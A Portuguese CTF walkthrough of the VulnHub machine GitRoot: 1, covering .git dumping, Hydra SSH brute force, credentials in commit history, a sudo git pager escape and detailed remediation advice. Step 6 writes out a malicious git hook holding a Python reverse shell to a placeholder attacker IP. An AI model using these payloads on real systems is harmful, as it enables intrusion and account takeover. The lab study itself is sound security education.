# GitRoot: 1 — Quando o Histórico de Versões Vira Arma Contra Você

Mano, git é a espinha dorsal do desenvolvimento moderno. Mas quando um diretório `.git/` fica exposto em servidor web de produção, o histórico completo do repositório vira presente embrulhado pra qualquer atacante com `wget`. GitRoot: 1 explora exatamente isso: cada etapa do ataque flui pelo git, desde o repositório exposto até o histórico de commits vazando senha, passando por git hook entregando RCE. O privesc? Um `sudo git` sem senha que abre escape de pager direto para root. Top demais de realismo, tá ligado? É o tipo de máquina que ensina mais segurança do que dez cursos.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | GitRoot: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/gitroot-1,627/ |
| **Técnicas** | enumeração de vhosts, recuperação de .git exposto, credenciais de arquivos deletados, brute-force SSH Hydra, análise de log de commits, RCE via git hook, GTFOBin sudo git pager |
| **CVEs** | CWE-538 (Exposição de Arquivos e Diretórios), CWE-522 (Credenciais Inadequadamente Protegidas), CWE-269 (Gerenciamento Impróprio de Privilégios) |
| **Grupos APT** | APT28 (Fancy Bear) — exfiltração de repositórios para coletar segredos; FIN7 — roubo de artefatos de desenvolvimento para pivotar em ambientes |

---

## Resumo do Ataque

```
nmap → WordPress em wp.gitroot.vuln
  → gobuster vhost → repo.gitroot.vuln
  → diretório /.git/ exposto
  → GitTools dumper + extractor
  → set.php deletado recuperado → credenciais (não funcionam no SSH)
  → Hydra brute-force SSH → pablo:SENHA
  → shell pablo → repositório git de beth em public/
  → git log --all → diff de commit revela senha de beth
  → shell beth → mensagem de jen: "joga um zip aqui que eu extraio"
  → .git/hooks/post-commit malicioso no zip → jen extrai → RCE
  → shell jen → cat ~/.viminfo → senha da jen
  → su jen → sudo git -p help config → !/bin/sh → root
```

---

## Metodologia

1. Scan de rede e enumeração de virtual hosts para mapear a superfície de ataque
2. Diretório `.git/` exposto despejado e reconstruído localmente
3. Arquivo PHP com credenciais deletado recuperado do object store do git
4. Brute-force SSH com Hydra usando o nome de usuário recuperado
5. Movimento lateral pablo → beth via vazamento no histórico de commits
6. Movimento lateral beth → jen via git hook malicioso dentro de zip
7. Recuperação de credencial do arquivo `.viminfo`
8. Root via escape de pager GTFOBins com sudo git

---

## Passo 1 — Descoberta de Rede e Mapeamento de vHosts

A máquina redireciona o tráfego HTTP para um hostname virtual, truque comum pra dificultar brute-force de diretórios contra IPs puros.

```bash
sudo netdiscover -r 192.168.10.0/24
nmap -A -p- 192.168.10.162
```

A porta 80 redireciona para `wp.gitroot.vuln`. Adicione ao `/etc/hosts`:

```
192.168.10.162  wp.gitroot.vuln
```

**O que é enumeração de vhost?** Servidores web hospedam vários sites no mesmo IP via header HTTP `Host:`. O modo vhost do Gobuster faz fuzzing nesse header pra descobrir sites escondidos:

```bash
gobuster vhost \
  -u http://192.168.10.162 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain \
  -t 40
# Encontrado: repo.gitroot.vuln
```

Atualize o `/etc/hosts`:
```
192.168.10.162  wp.gitroot.vuln repo.gitroot.vuln
```

**Alternativa:** `ffuf -w wordlist.txt -H "Host: FUZZ.gitroot.vuln" -u http://192.168.10.162`

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1190 — Exploração de Aplicação Pública

---

## Passo 2 — Extraindo o Diretório .git Exposto

`repo.gitroot.vuln` roda uma página de hospedagem de código com `/.git/` acessível publicamente. Ixi, configuração clássica de ambiente de dev promovido para produção sem revisão.

**O que é exposição de `.git/`?** O git armazena todo o histórico do repositório, incluindo arquivos deletados, commits antigos e credenciais, no diretório `.git/`. Ferramentas como GitTools reconstroem o repositório completo a partir dos object files acessíveis por HTTP.

```bash
# Instale o GitTools se necessário
git clone https://github.com/internetwache/GitTools /opt/GitTools

# Despeja todos os objetos .git
/opt/GitTools/Dumper/gitdumper.sh \
  http://repo.gitroot.vuln/.git/ \
  /tmp/gitroot/git-tmp/

# Reconstrói os arquivos fonte incluindo os deletados
/opt/GitTools/Extractor/extractor.sh \
  /tmp/gitroot/git-tmp/ \
  /tmp/gitroot/extracted/
```

**Alternativa:** `git-dumper` (pip install git-dumper) é abordagem de ferramenta única com melhor tratamento de erros.

**Nota do mundo real:** Em 2023, várias organizações usando instâncias GitLab auto-hospedadas expuseram diretórios `.git/` via proxies reversos Nginx mal configurados. A CISA emitiu orientação específica sobre essa classe de exposição. CWE-538 cobre esse padrão.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 3 — Recuperando Credenciais Deletadas

O extrator reconstrói todos os commits, incluindo arquivos deletados do HEAD. Um dos arquivos recuperados é `set.php`:

```bash
find /tmp/gitroot/extracted -name "*.php" | xargs grep -l "pass\|cred\|user" 2>/dev/null
cat /tmp/gitroot/extracted/*/set.php
```

O arquivo contém credenciais estilo banco de dados. Infelizmente não funcionam diretamente no SSH, vacilou. Mas confirmam um nome de usuário: **pablo**.

**Nota de rabbit hole:** É tentador tentar essas credenciais em todo lugar primeiro. Não funcionam nem no SSH nem no WordPress. O útil aqui é o nome de usuário.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos (recuperação de arquivo deletado do histórico VCS)

---

## Passo 4 — Brute-Force SSH com Hydra (pablo)

Com nome de usuário confirmado, brute-force no SSH é o próximo passo lógico, né:

```bash
hydra -l pablo \
  -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.10.162 \
  -t 4 -V -f
```

O `-f` para na primeira senha certa, e `-t 4` mantém as threads baixas pra evitar rate-limiting do SSH.

```bash
ssh pablo@192.168.10.162
cat user.txt
```

**Alternativa:** Medusa: `medusa -h 192.168.10.162 -u pablo -P rockyou.txt -M ssh -t 4`

**Nota do mundo real:** Brute-force SSH é constante no mundo real, véi. O Shodan indexa milhões de serviços SSH expostos. O APT28 (Fancy Bear), grupo ligado ao GRU russo, usou extensivamente credential stuffing e brute-force SSH em operações contra infraestrutura ucraniana. Fail2ban + autenticação só por chave bloqueia isso completamente.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 5 — Movimento Lateral: pablo → beth via Histórico de Commits

Boa, shell do pablo em mãos. Mas pablo não é root. Hora de explorar:

```bash
ls -la ~/
ls -la ~/public/
```

O home do pablo tem um diretório `public/` que é na verdade um repositório git de um projeto de outra usuária. Inspecione o histórico de commits:

```bash
cd ~/public
git log --all --oneline
# Procure commits com tamanhos de diff que sugiram adições de credenciais
git show <commit-hash>
```

No diff de um commit rotulado algo como "add some stuff", a senha da beth aparece como valor em texto puro em um script. Erro clássico de "vou colocar a senha aqui e deletar depois", só que o git nunca esquece, mano.

```bash
su beth
# use a senha recuperada
```

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos (histórico VCS); T1021.004 — Serviços Remotos: SSH

---

## Passo 6 — Movimento Lateral: beth → jen via Git Hook RCE

( ͡° ͜ʖ ͡°) Aqui fica interessante demais. No ambiente da beth tem uma mensagem da jen: ela vai extrair qualquer zip jogado em uma pasta específica. O processo de extração da jen inclui processar repositórios git, o que significa que hooks `post-commit` vão disparar.

**O que é um git post-commit hook?** Hooks git são scripts que rodam automaticamente em pontos específicos do fluxo de trabalho git. Um hook `post-commit` executa toda vez que um commit é feito. Se o handler automatizado de zip da jen extrai um arquivo contendo um script `.git/hooks/post-commit` e depois roda `git commit`, o hook dispara como jen.

```bash
# Construa o zip malicioso
mkdir -p /tmp/payload/.git/hooks

cat > /tmp/payload/.git/hooks/post-commit << 'EOF'
#!/bin/bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP_ATACANTE",9999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
EOF
chmod +x /tmp/payload/.git/hooks/post-commit

# Prepare um commit pra o hook estar pronto pra disparar
cd /tmp/payload
git init
git config user.email "x@x.com"
git config user.name "x"
touch trigger
git add .
git commit -m "initial"

# Empacote
cd /tmp
7z a payload.zip payload/
cp payload.zip /caminho/para/pasta/da/jen/
```

Inicie o listener:
```bash
nc -lvp 9999
```

Quando o processo/cron da jen extrai o zip e toca o repositório, o shell dispara. Da hora!

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Unix Shell; T1053.003 — Tarefa Agendada: Cron

---

## Passo 7 — Recuperação de Credencial do .viminfo

O `.viminfo` armazena o histórico de comandos do Vim, incluindo linhas digitadas durante edição de arquivos. Senhas inseridas ao editar arquivos de configuração aparecem frequentemente aqui:

```bash
cat ~/.viminfo
# Procure linhas começando com "> /caminho/para/config" e histórico de comandos abaixo
# A senha da jen vai aparecer no histórico de comandos de uma sessão vim
```

**MITRE ATT&CK:** T1552.003 — Credenciais no Histórico Bash (padrão análogo: credenciais armazenadas em artefatos); T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 8 — Escalonamento de Privilégios: Escape de Pager sudo git (Root)

Faça login como jen e verifique direitos sudo:

```bash
su jen
sudo -l
# (root) NOPASSWD: /usr/bin/git
```

**O que é o escape de pager do git?** Quando subcomandos git produzem saída paginada, o git invoca o `less` (ou o pager configurado). Dentro do `less`, o comando `!` executa um comando de shell. Como o git está rodando como root, o shell gerado herda privilégios de root. Técnica clássica do GTFOBins.

```bash
sudo git -p help config
# Aguarde o pager abrir, depois digite:
!/bin/sh
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

(☞ﾟヮﾟ)☞ Root. É nóis!

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo; T1059.004 — Interpretador de Comandos: Unix Shell

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado em | Crackeado/Usado |
|---|---|---|---|
| Usuário | pablo | set.php (deletado, recuperado via git) | Hydra brute → pablo:SENHA |
| Credencial | senha da beth | diff de commit no repo public/ de pablo | su beth |
| Credencial | senha da jen | ~/.viminfo da jen | su jen |
| Flag de usuário | user.txt | /home/pablo/user.txt | leitura |
| Flag de root | root.txt | /root/root.txt | sudo git pager |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | `.git/` exposto em `repo.gitroot.vuln` | Deployments de produção construídos de repos git frequentemente incluem `.git/` se o processo de deploy copia o diretório de trabalho literalmente | Bloqueie `/.git/` na camada do web server; faça deploy de artefatos, não de árvores fonte |
| 2 | Credenciais commitadas e deletadas ainda existem no histórico | Todo vazamento reportado no programa GitHub Secret Scanning segue esse padrão | Use `git filter-repo` ou BFG Repo-Cleaner para limpar o histórico; rotacione todas as credenciais afetadas |
| 3 | Extração de zip sem sandbox rodou hooks git arbitrários | Qualquer serviço que extrai arquivos fornecidos por usuários e processa seu conteúdo é candidato a RCE | Valide o conteúdo do arquivo antes da extração; rode extração em containers isolados |
| 4 | `sudo git` NOPASSWD concede root via pager | GTFOBins documenta 10+ vetores de escalonamento via git. Muitas organizações concedem sudo amplo a devs "por conveniência" | Aplique o princípio do menor privilégio; audite sudoers regularmente |

---

## MITRE ATT&CK Mapping

| Fase | Tática | Técnica | TTP ID |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Persistência | Persistência | Execução Disparada por Evento: Unix Shell Hook | T1546.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Mecanismo de Controle de Elevação: Sudo | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Bloqueie acesso ao `.git/` na camada do web server** — Nginx: `location ~ /\.git { deny all; }` Apache: `<DirectoryMatch "\.git"> Require all denied </DirectoryMatch>`
2. **Faça deploy de artefatos, não de árvores fonte** — use pipelines CI/CD que constroem e copiam apenas arquivos de produção, nunca o diretório `.git/`
3. **Rotacione todas as credenciais encontradas no histórico git** — use `git filter-repo` (preferido ao obsoleto `filter-branch`) ou BFG Repo-Cleaner
4. **Hooks de pré-commit para detecção de segredos** — integre `trufflehog`, `gitleaks` ou a proteção de push do GitHub para rejeitar commits com segredos
5. **Sanitize extração de zip** — rode em containers (gVisor, Firejail); valide estrutura do arquivo; ignore explicitamente diretórios `.git/`
6. **Restrinja sudo a subcomandos seguros** — se git deve estar no sudoers, use: `(root) NOPASSWD: /usr/bin/git diff` em vez de `/usr/bin/git` sem restrição

### Se Você Encontrar Isso no Seu Ambiente

- Rotacione imediatamente todas as credenciais visíveis em qualquer histórico git exposto
- Verifique logs do web server por acesso a `/.git/objects/` ou `/.git/refs/`, indica exfiltração ativa
- Audite sudoers para binários de controle de versão (git, svn, hg) e remova ou restrinja

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Auditar todos os diretórios acessíveis na web por exposição de `.git/` |
| Proteger | Controle de Acesso | Implementar regras de negação no web server para `.git/`; least privilege em sudoers |
| Proteger | Segurança de Dados | Escaneamento de segredos pré-commit; política de rotação de credenciais |
| Detectar | Anomalias e Eventos | Alertar sobre acesso HTTP a `/.git/objects/` |
| Responder | Planejamento de Resposta | Revogar e rotacionar credenciais imediatamente na exposição |
| Recuperar | Planejamento de Recuperação | Usar `git filter-repo` para purgar segredos do histórico |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Controles de acesso do web server bloqueando `.git/` |
| AC-6 | Menor Privilégio | sudo restrito a comandos específicos e seguros |
| IA-5 | Gerenciamento de Autenticadores | Política de rotação de credenciais para segredos expostos via git |
| CM-7 | Funcionalidade Mínima | Desabilitar serviços desnecessários; deployar web roots mínimas |
| SI-7 | Integridade de Software, Firmware e Informação | Hooks pré-commit + escaneamento de repositório para segredos |
| AU-12 | Geração de Registro de Auditoria | Registrar requisições HTTP para caminhos sensíveis |

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos TI e OT | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

---

## Reflexão Final

Parabéns ao criador do GitRoot: 1, véi, essa máquina é tematicamente perfeita. Cada passo do ataque usa git como vulnerabilidade, pivô ou exploit. Do repositório exposto ao movimento lateral via hook até o GTFOBin de pager, é uma aula magistral de como uma única ferramenta, mal configurada em múltiplas camadas, vira uma cadeia de ataque completa.

Pra quem está começando: essa máquina é uma mina de ouro pra entender por que práticas de DevSecOps como escaneamento pré-commit, deployments somente de artefatos e auditoria de sudoers importam. Não são hipotéticas, são os controles exatos que teriam bloqueado cada passo dessa kill chain.

Continue hackeando, continue aprendendo. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
